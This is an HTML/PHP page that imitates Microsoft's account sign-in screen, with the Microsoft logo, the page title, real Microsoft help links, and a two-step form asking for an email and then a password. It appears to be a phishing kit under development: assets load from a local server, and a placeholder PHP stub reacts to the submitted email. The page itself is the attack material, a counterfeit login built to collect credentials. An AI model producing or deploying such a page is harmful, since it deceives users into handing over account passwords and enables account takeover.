<!DOCTYPE html>
<html>
<?php
if ($_GET['email'])
{
echo "coucou";
}
?>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Sign in to your Microsoft account</title>
    <link rel="icon" type="image/svg+xml" sizes="21x21" href="http://127.0.0.1:8090/assets/img/favicon16.svg">
    <link rel="icon" type="image/svg+xml" sizes="43x43" href="http://127.0.0.1:8090/assets/img/favicon32.svg">
    <link rel="icon" type="image/svg+xml" sizes="240x240" href="http://127.0.0.1:8090/assets/img/favicon%20180.svg">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css">
    <link rel="stylesheet" href="http://127.0.0.1:8090/assets/css/styles.min.css">
</head>

<body class="text-nowrap" style="width: 100%;height: 100vh;">
    <div id="loginForm" class="container"><img id="image" src="http://127.0.0.1:8090/assets/img/microsoft_logo.svg">
        <div></div>
        <section id="section-main">
            <form action="" method="get"name="form">
                <section id="section-1" class="slide-page">
                    <p id="signIn" class="field">Sign in</p>
                    <h5 id="result"></h5>
                    <input type="email" name="email" id="email" class="field" placeholder="Email, phone, or Skype" />
                    <p id="NoAccount" class="field">No account?
                    <a id="linkCreateAccount" href="https://signup.live.com/?lic=1" style="color: #0067b8;">Create One!</a></p>
                    <p id="signInSecurityKey" class="field">
                    <a href="https://support.microsoft.com/en-us/help/4463210/windows-10-sign-in-microsoft-account-windows-hello-security-key" style="color: #0067b8;">Sign in with a security key</a>
                    <i class="far fa-question-circle fa-lg" id="iconQ"></i></p>
                    <p id="signInOptions" class="field">
                    <a href="https://account.microsoft.com/account/manage-my-account" style="color: #0067b8;">Sign-in options</a></p>
                    <p id="btnPlace" class="field"><button class="firstNext next" href="#next" type="button" id="btnSend">Next</button></p>
                </section>
                <section id="section-2" class="page secondSlide">
                    <p id="userLine">P</p><button class="btn btn-primary btn-sm py-0 prev-1" id="btnBack" type="button"
                        style="font-size: 12px;height: 25px;width: 26px;"><i class="la la-long-arrow-left" id="arrowBack-1"
                            style="width: 1px;font-size: 19px;font-weight: 800;margin: -1px;"></i></button>
                    <p id="enterPwd">Enter Password</p>
                    <h5 id="passResult"></h5>
                    <p><input type="password" name="password" id="password" placeholder="Password"></p>
                    <p id="keepMe">Keep me signed in</p><input type="checkbox" id="cbRemember">
                    <p id="ForgodPwd"><a href="#">Forgot password?</a></p>
                    <p id="SignWithKey"><a href="#">Sign in with Windows Hello or a security key</a></p>
                    <p id="btnSignInLocation"><button id="btnSignIn" class="submit" type="button">Sign in</button><input type="submit"></p>
                </section>
            </form>
        </section>
    </div>
    <div id="footer" style="height: 36px;">
        <div id="terms" style="float: left;width: 84px;">
            <p style="font-size: 13px;text-align: left;">Terms of use</p>
        </div>
        <div style="float: left;width: 105px;">
            <p style="font-size: 12px;">Privacy &amp; cookies</p>
        </div>
        <div style="float: left;width: 24px;">
            <p style="font-size: 12px;">•••<br></p>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
    <script src="http://127.0.0.1:8090/assets/js/script.min.js"></script>
</body>

</html>